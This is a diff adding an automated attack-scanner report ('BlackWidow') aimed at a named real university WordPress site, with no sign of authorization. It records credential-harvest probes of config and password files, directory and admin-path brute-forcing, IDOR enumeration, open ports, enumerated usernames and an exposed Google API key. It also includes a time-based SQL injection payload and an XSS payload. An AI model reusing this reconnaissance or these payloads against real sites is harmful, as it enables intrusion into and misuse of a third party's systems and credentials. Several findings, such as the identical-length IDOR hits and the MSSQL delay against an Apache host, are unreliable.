@@ -1,0 +1,785 @@
+BlackWidow Report — 20261113_100310
+============================================================
+
+
+=== auth_bypass_scan.json ===
+
+=== brute_force.json ===
+
+=== cred_harvest.json ===
+{
+  "url": "https://balaibahasa.upi.edu/wp-config.php",
+  "status": 200,
+  "size": 0,
+  "credentials": []
+}
+{
+  "url": "https://balaibahasa.upi.edu/.htpasswd",
+  "status": 403,
+  "size": 285,
+  "note": "Forbidden \u2014 file may exist but access is blocked",
+  "credentials": []
+}
+{
+  "url": "https://balaibahasa.upi.edu/server-status",
+  "status": 403,
+  "size": 285,
+  "note": "Forbidden \u2014 file may exist but access is blocked",
+  "credentials": []
+}
+{
+  "url": "https://balaibahasa.upi.edu/robots.txt",
+  "status": 200,
+  "size": 127,
+  "credentials": []
+}
+
+=== defacement_check.json ===
+{
+  "url": "https://ingetinaja.web.id?id=1",
+  "defacement_keywords": [],
+  "changed": null,
+  "hash_mismatch": null
+}
+
+=== detect.json ===
+{
+  "url": "https://balaibahasa.upi.edu",
+  "final_url": "https://balaibahasa.upi.edu/",
+  "status": 200,
+  "server": "Apache/2.4.58 (Ubuntu)",
+  "x_powered_by": "",
+  "frameworks": [
+    {
+      "name": "WordPress",
+      "evidence": [
+        "html:wp-content"
+      ],
+      "score": 1
+    },
+    {
+      "name": "Google Font API",
+      "evidence": [
+        "html:fonts.googleapis.com"
+      ],
+      "score": 1
+    },
+    {
+      "name": "React",
+      "evidence": [
+        "js:createElement"
+      ],
+      "score": 1
+    }
+  ],
+  "top": {
+    "name": "WordPress",
+    "evidence": [
+      "html:wp-content"
+    ],
+    "score": 1,
+    "wordlist": "wordlists/framework/wordpress.txt"
+  },
+  "api_base": null,
+  "live_api_endpoints": [],
+  "raw_headers": {
+    "Date": "Fri, 13 Nov 2026 02:24:44 GMT",
+    "Server": "Apache/2.4.58 (Ubuntu)",
+    "Link": "<https://cdn.gtranslate.net/>; rel=dns-prefetch",
+    "No-Vary-Search": "params=(\"PageSpeed\")",
+    "Vary": "Accept-Encoding",
+    "Content-Encoding": "gzip",
+    "Content-Length": "44522",
+    "Keep-Alive": "timeout=5, max=100",
+    "Connection": "Keep-Alive",
+    "Content-Type": "text/html; charset=UTF-8"
+  }
+}
+
+=== dir_scan.json ===
+{
+  "url": "https://balaibahasa.upi.edu/wp-includes",
+  "status": 301,
+  "size": 334,
+  "content_type": "text/html; charset=iso-8859-1"
+}
+{
+  "url": "https://balaibahasa.upi.edu/wp-content",
+  "status": 301,
+  "size": 333,
+  "content_type": "text/html; charset=iso-8859-1"
+}
+{
+  "url": "https://balaibahasa.upi.edu/management",
+  "status": 301,
+  "size": 0,
+  "content_type": "text/html; charset=UTF-8"
+}
+{
+  "url": "https://balaibahasa.upi.edu/server-status",
+  "status": 403,
+  "size": 285,
+  "content_type": "text/html; charset=iso-8859-1"
+}
+{
+  "url": "https://balaibahasa.upi.edu/wp-admin",
+  "status": 301,
+  "size": 331,
+  "content_type": "text/html; charset=iso-8859-1"
+}
+{
+  "url": "https://balaibahasa.upi.edu/admin",
+  "status": 302,
+  "size": 0,
+  "content_type": "text/html; charset=UTF-8"
+}
+{
+  "url": "https://balaibahasa.upi.edu/admin/",
+  "status": 302,
+  "size": 0,
+  "content_type": "text/html; charset=UTF-8"
+}
+{
+  "url": "https://balaibahasa.upi.edu/.cache",
+  "status": 301,
+  "size": 0,
+  "content_type": "text/html; charset=UTF-8"
+}
+{
+  "url": "https://balaibahasa.upi.edu/phpmyadmin",
+  "status": 301,
+  "size": 333,
+  "content_type": "text/html; charset=iso-8859-1"
+}
+{
+  "url": "https://balaibahasa.upi.edu/robots.txt",
+  "status": 200,
+  "size": 127,
+  "content_type": "text/plain"
+}
+{
+  "url": "https://balaibahasa.upi.edu/sitemap.xml",
+  "status": 301,
+  "size": 0,
+  "content_type": "text/html; charset=UTF-8"
+}
+{
+  "url": "https://balaibahasa.upi.edu/.htpasswd",
+  "status": 403,
+  "size": 285,
+  "content_type": "text/html; charset=iso-8859-1"
+}
+{
+  "url": "https://balaibahasa.upi.edu/license.txt",
+  "status": 200,
+  "size": 19903,
+  "content_type": "text/plain"
+}
+{
+  "url": "https://balaibahasa.upi.edu/readme.html",
+  "status": 200,
+  "size": 7407,
+  "content_type": "text/html"
+}
+{
+  "url": "https://balaibahasa.upi.edu/.htaccess",
+  "status": 403,
+  "size": 285,
+  "content_type": "text/html; charset=iso-8859-1"
+}
+{
+  "url": "https://balaibahasa.upi.edu/dashboard",
+  "status": 302,
+  "size": 0,
+  "content_type": "text/html; charset=UTF-8"
+}
+{
+  "url": "https://balaibahasa.upi.edu/admin/index.php",
+  "status": 301,
+  "size": 0,
+  "content_type": "text/html; charset=UTF-8"
+}
+{
+  "url": "https://balaibahasa.upi.edu/login",
+  "status": 302,
+  "size": 0,
+  "content_type": "text/html; charset=UTF-8"
+}
+{
+  "url": "https://balaibahasa.upi.edu/about",
+  "status": 301,
+  "size": 0,
+  "content_type": "text/html; charset=UTF-8"
+}
+{
+  "url": "https://balaibahasa.upi.edu/contact",
+  "status": 301,
+  "size": 0,
+  "content_type": "text/html; charset=UTF-8"
+}
+{
+  "url": "https://balaibahasa.upi.edu/atom",
+  "status": 301,
+  "size": 0,
+  "content_type": "application/atom+xml; charset=UTF-8"
+}
+{
+  "url": "https://balaibahasa.upi.edu/rss",
+  "status": 301,
+  "size": 0,
+  "content_type": "application/rss+xml; charset=UTF-8"
+}
+{
+  "url": "https://balaibahasa.upi.edu/favicon.ico",
+  "status": 200,
+  "size": 3695,
+  "content_type": "image/vnd.microsoft.icon"
+}
+
+=== idor_scan.json ===
+{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=2",
+  "param": "id",
+  "id_tested": 2,
+  "status": 200,
+  "response_length": 282940
+}
+{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=3",
+  "param": "id",
+  "id_tested": 3,
+  "status": 200,
+  "response_length": 282940
+}
+{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=4",
+  "param": "id",
+  "id_tested": 4,
+  "status": 200,
+  "response_length": 282940
+}
+{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=5",
+  "param": "id",
+  "id_tested": 5,
+  "status": 200,
+  "response_length": 282940
+}
+{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=6",
+  "param": "id",
+  "id_tested": 6,
+  "status": 200,
+  "response_length": 282940
+}
+{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=7",
+  "param": "id",
+  "id_tested": 7,
+  "status": 200,
+  "response_length": 282940
+}
+{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=8",
+  "param": "id",
+  "id_tested": 8,
+  "status": 200,
+  "response_length": 282940
+}
+{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=9",
+  "param": "id",
+  "id_tested": 9,
+  "status": 200,
+  "response_length": 282940
+}
+{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=10",
+  "param": "id",
+  "id_tested": 10,
+  "status": 200,
+  "response_length": 282940
+}
+{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=11",
+  "param": "id",
+  "id_tested": 11,
+  "status": 200,
+  "response_length": 282940
+}
+{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=12",
+  "param": "id",
+  "id_tested": 12,
+  "status": 200,
+  "response_length": 282940
+}
+{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=13",
+  "param": "id",
+  "id_tested": 13,
+  "status": 200,
+  "response_length": 282940
+}
+{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=14",
+  "param": "id",
+  "id_tested": 14,
+  "status": 200,
+  "response_length": 282940
+}
+{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=15",
+  "param": "id",
+  "id_tested": 15,
+  "status": 200,
+  "response_length": 282940
+}
+{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=16",
+  "param": "id",
+  "id_tested": 16,
+  "status": 200,
+  "response_length": 282940
+}
+{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=17",
+  "param": "id",
+  "id_tested": 17,
+  "status": 200,
+  "response_length": 282940
+}
+{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=18",
+  "param": "id",
+  "id_tested": 18,
+  "status": 200,
+  "response_length": 282940
+}
+{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=19",
+  "param": "id",
+  "id_tested": 19,
+  "status": 200,
+  "response_length": 282940
+}
+{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=20",
+  "param": "id",
+  "id_tested": 20,
+  "status": 200,
+  "response_length": 282940
+}
+{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=21",
+  "param": "id",
+  "id_tested": 21,
+  "status": 200,
+  "response_length": 282940
+}
+{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=22",
+  "param": "id",
+  "id_tested": 22,
+  "status": 200,
+  "response_length": 282940
+}
+{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=23",
+  "param": "id",
+  "id_tested": 23,
+  "status": 200,
+  "response_length": 282940
+}
+{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=24",
+  "param": "id",
+  "id_tested": 24,
+  "status": 200,
+  "response_length": 282940
+}
+{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=25",
+  "param": "id",
+  "id_tested": 25,
+  "status": 200,
+  "response_length": 282940
+}
+{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=26",
+  "param": "id",
+  "id_tested": 26,
+  "status": 200,
+  "response_length": 282940
+}
+{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=27",
+  "param": "id",
+  "id_tested": 27,
+  "status": 200,
+  "response_length": 282940
+}
+{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=28",
+  "param": "id",
+  "id_tested": 28,
+  "status": 200,
+  "response_length": 282940
+}
+{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=29",
+  "param": "id",
+  "id_tested": 29,
+  "status": 200,
+  "response_length": 282940
+}
+{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=30",
+  "param": "id",
+  "id_tested": 30,
+  "status": 200,
+  "response_length": 282940
+}
+{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=31",
+  "param": "id",
+  "id_tested": 31,
+  "status": 200,
+  "response_length": 282940
+}
+{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=32",
+  "param": "id",
+  "id_tested": 32,
+  "status": 200,
+  "response_length": 282940
+}
+{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=33",
+  "param": "id",
+  "id_tested": 33,
+  "status": 200,
+  "response_length": 282940
+}
+{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=34",
+  "param": "id",
+  "id_tested": 34,
+  "status": 200,
+  "response_length": 282940
+}
+{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=35",
+  "param": "id",
+  "id_tested": 35,
+  "status": 200,
+  "response_length": 282940
+}
+{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=36",
+  "param": "id",
+  "id_tested": 36,
+  "status": 200,
+  "response_length": 282940
+}
+{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=37",
+  "param": "id",
+  "id_tested": 37,
+  "status": 200,
+  "response_length": 282940
+}
+{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=38",
+  "param": "id",
+  "id_tested": 38,
+  "status": 200,
+  "response_length": 282940
+}
+{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=39",
+  "param": "id",
+  "id_tested": 39,
+  "status": 200,
+  "response_length": 282940
+}
+{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=40",
+  "param": "id",
+  "id_tested": 40,
+  "status": 200,
+  "response_length": 282940
+}
+{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=42",
+  "param": "id",
+  "id_tested": 42,
+  "status": 200,
+  "response_length": 282940
+}
+{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=43",
+  "param": "id",
+  "id_tested": 43,
+  "status": 200,
+  "response_length": 282940
+}
+{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=44",
+  "param": "id",
+  "id_tested": 44,
+  "status": 200,
+  "response_length": 282940
+}
+{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=45",
+  "param": "id",
+  "id_tested": 45,
+  "status": 200,
+  "response_length": 282940
+}
+{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=46",
+  "param": "id",
+  "id_tested": 46,
+  "status": 200,
+  "response_length": 282940
+}
+{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=47",
+  "param": "id",
+  "id_tested": 47,
+  "status": 200,
+  "response_length": 282940
+}
+{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=48",
+  "param": "id",
+  "id_tested": 48,
+  "status": 200,
+  "response_length": 282940
+}
+{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=49",
+  "param": "id",
+  "id_tested": 49,
+  "status": 200,
+  "response_length": 282940
+}
+{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=50",
+  "param": "id",
+  "id_tested": 50,
+  "status": 200,
+  "response_length": 282940
+}
+
+=== js_mine.json ===
+{
+  "target": "https://balaibahasa.upi.edu",
+  "bundles_analyzed": [
+    "inline_html",
+    "https://balaibahasa.upi.edu/wp-content/plugins/eventon-lite/assets/js/eventon_script.js?ver=2.5.9",
+    "https://cdn.tailwindcss.com",
+    "https://balaibahasa.upi.edu/wp-content/themes/Divi-2/includes/builder-5/visual-builder/build/script-library-ext-waypoint.js?ver=5.2.0",
+    "https://balaibahasa.upi.edu/wp-content/themes/Divi-2/includes/builder-5/visual-builder/build/script-library-sticky-elements.js?ver=5.2.0",
+    "https://cdn.jsdelivr.net/wp/wp-slimstat/tags/5.5.0/wp-slimstat.min.js",
+    "https://balaibahasa.upi.edu/wp-content/themes/Divi-2/js/theme-scripts-library-base.js?ver=5.2.0",
+    "https://balaibahasa.upi.edu/wp-content/themes/Divi-2/includes/builder-5/visual-builder/build/script-library-jquery.mobile.js?ver=5.2.0",
+    "https://use.fontawesome.com/releases/v6.4.2/js/all.js",
+    "https://balaibahasa.upi.edu/wp-content/themes/Divi-2/includes/builder-5/visual-builder/build/script-library-menu.js?ver=5.2.0",
+    "https://balaibahasa.upi.edu/wp-content/themes/Divi-2/includes/builder-5/visual-builder/build/script-library-slider.js?ver=5.2.0",
+    "https://balaibahasa.upi.edu/wp-content/plugins/eventon-lite/assets/js/lib/handlebars.js?ver=2.5.9",
+    "https://balaibahasa.upi.edu/wp-content/themes/Divi-2/includes/builder-5/visual-builder/build/script-library-section-dividers.js?ver=5.2.0",
+    "https://balaibahasa.upi.edu/wp-content/themes/Divi-2/includes/builder-5/visual-builder/build/script-library-jquery.fitvids.js?ver=5.2.0",
+    "https://balaibahasa.upi.edu/wp-content/themes/Divi-2/includes/builder-5/visual-builder/build/script-library-fitvids-functions.js?ver=5.2.0",
+    "https://balaibahasa.upi.edu/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1",
+    "https://maps.googleapis.com/maps/api/js?key=AIzaSyCV0yuM4FqXONp5hECT2Q_0wTsnDPD6q58&callback=Function.prototype&loading=async&libraries=marker,places&ver=1.0",
+    "https://balaibahasa.upi.edu/wp-content/plugins/eventon-lite/assets/js/lib/jquery.mousewheel.min.js?ver=2.5.9",
+    "https://balaibahasa.upi.edu/wp-content/themes/Divi-2/includes/builder-5/visual-builder/build/script-library-frontend-global-functions.js?ver=5.2.0",
+    "https://balaibahasa.upi.edu/wp-content/plugins/gtranslate/js/fn.js?ver=5.0.1",
+    "https://balaibahasa.upi.edu/wp-content/themes/Divi-2/includes/builder-5/visual-builder/build/script-library-frontend-scripts.js?ver=5.2.0",
+    "https://meet.jit.si/external_api.js?ver=2.5.9",
+    "https://balaibahasa.upi.edu/wp-content/plugins/wp-accessibility/js/wpa-toolbar.min.js?ver=2.4.5",
+    "https://balaibahasa.upi.edu/wp-content/plugins/eventon-lite/assets/js/maps/eventon_gen_maps.js?ver=2.5.9",
+    "https://balaibahasa.upi.edu/wp-content/plugins/eventon-lite/assets/js/lib/moment.min.js?ver=2.5.9",
+    "https://balaibahasa.upi.edu/wp-content/themes/Divi-2/includes/builder-5/visual-builder/build/script-library-animation.js?ver=5.2.0",
+    "https://balaibahasa.upi.edu/wp-content/plugins/megamenu/js/maxmegamenu.min.js?ver=3.10.8",
+    "https://balaibahasa.upi.edu/wp-includes/js/hoverIntent.min.js?ver=1.10.2",
+    "https://balaibahasa.upi.edu/wp-content/plugins/eventon-lite/assets/js/lib/moment_timezone_min.js?ver=2.5.9",
+    "https://balaibahasa.upi.edu/wp-content/themes/Divi-2/core/admin/js/common.js?ver=5.2.0",
+    "https://netdna.bootstrapcdn.com/bootstrap/3.2.0/js/bootstrap.min.js",
+    "https://balaibahasa.upi.edu/wp-content/plugins/eventon-lite/assets/js/lib/jquery.easing.1.3.js?ver=1.0",
+    "https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/js/bootstrap.min.js",
+    "https://balaibahasa.upi.edu/wp-content/themes/Divi-2/includes/builder-5/visual-builder/build/script-library-multi-view.js?ver=5.2.0",
+    "https://balaibahasa.upi.edu/wp-content/plugins/wp-accessibility/js/wp-accessibility.min.js?ver=2.4.5",
+    "https://balaibahasa.upi.edu/wp-content/themes/Divi-2/js/theme-scripts-library-scroll-to-top.js?ver=5.2.0",
+    "https://balaibahasa.upi.edu/wp-includes/js/jquery/jquery.min.js?ver=3.7.1",
+    "https://balaibahasa.upi.edu/wp-content/plugins/eventon-lite/assets/js/eventon_functions.js?ver=2.5.9",
+    "https://code.jquery.com/jquery-1.11.1.min.js",
+    "https://balaibahasa.upi.edu/wp-content/plugins/eventon-lite/assets/js/lib/jquery.mobile.min.js?ver=2.5.9"
+  ],
+  "api_endpoints": [
+    "https://maps.googleapis.com/maps-api-v3/api/js/66/13d",
+    "https://maps.googleapis.com/maps-api-v3/api/js/66/13d/common.js",
+    "https://maps.googleapis.com/maps-api-v3/api/js/66/13d/controls.js",
+    "https://maps.googleapis.com/maps-api-v3/api/js/66/13d/main.js",
+    "https://maps.googleapis.com/maps-api-v3/api/js/66/13d/marker.js",
+    "https://maps.googleapis.com/maps-api-v3/api/js/66/13d/places.js",
+    "https://maps.googleapis.com/maps-api-v3/api/js/66/13d/places_impl.js",
+    "https://maps.googleapis.com/maps-api-v3/api/js/66/13d/util.js",
+    "https://maps.googleapis.com/maps/api/js/GeoPhotoService.GetMetadata",
+    "https://maps.googleapis.com/maps/api/js/GeoPhotoService.SingleImageSearch",
+    "/${C}",
+    "/${i}",
+    "//${n}"
+  ],
+  "client_routes": [],
+  "secrets": [
+    {
+      "type": "Firebase API Key",
+      "value": "AIzaSyCV0yuM4FqXONp5hECT2Q_0wTsnDPD6q58",
+      "source": "https://maps.googleapis.com/maps/api/js?key=AIzaSyCV0yuM4FqXONp5hECT2Q_0wTsnDPD6q58&callback=Function.prototype&loading=async&libraries=marker,places&ver=1.0"
+    }
+  ],
+  "env_vars": []
+}
+
+=== port_scan.json ===
+{
+  "port": 22,
+  "status": "open",
+  "service": "ssh"
+}
+{
+  "port": 53,
+  "status": "open",
+  "service": "domain"
+}
+
+=== session_scan.json ===
+
+=== sqli_scan.json ===
+{
+  "type": "SQLi (Time-Based Blind)",
+  "url": "https://balaibahasa.upi.edu?id=%27%3B+WAITFOR+DELAY+%270%3A0%3A4%27--",
+  "param": "id",
+  "payload": "'; WAITFOR DELAY '0:0:4'--",
+  "evidence": "Response took 9.84s"
+}
+
+=== ssrf_scan.json ===
+
+=== subdomain_scan.json ===
+
+=== wp_scan.json ===
+{
+  "type": "WP Exposed Path",
+  "url": "https://balaibahasa.upi.edu/wp-admin",
+  "status": 200
+}
+{
+  "type": "WP Exposed Path",
+  "url": "https://balaibahasa.upi.edu/wp-content",
+  "status": 200
+}
+{
+  "type": "WP Exposed Path",
+  "url": "https://balaibahasa.upi.edu/wp-includes",
+  "status": 200
+}
+{
+  "type": "WP Exposed Path",
+  "url": "https://balaibahasa.upi.edu/readme.html",
+  "status": 200
+}
+{
+  "type": "WP Exposed Path",
+  "url": "https://balaibahasa.upi.edu/license.txt",
+  "status": 200
+}
+{
+  "type": "WP Exposed Path",
+  "url": "https://balaibahasa.upi.edu/wp-json/wp/v2/users",
+  "status": 200
+}
+{
+  "type": "WP Exposed Path",
+  "url": "https://balaibahasa.upi.edu/wp-json/",
+  "status": 200
+}
+{
+  "type": "WP User Enumeration",
+  "users": [
+    {
+      "id": 7,
+      "slug": "endang",
+      "name": "admin"
+    },
+    {
+      "id": 3,
+      "slug": "agus_bb",
+      "name": "agus_bb"
+    },
+    {
+      "id": 1,
+      "slug": "admin"
+    }
+  ]
+}
+
+=== xss_scan.json ===
+{
+  "type": "XSS (Reflected)",
+  "url": "https://balaibahasa.upi.edu/",
+  "payload": "javascript:alert(1)",
+  "field": "s"
+}
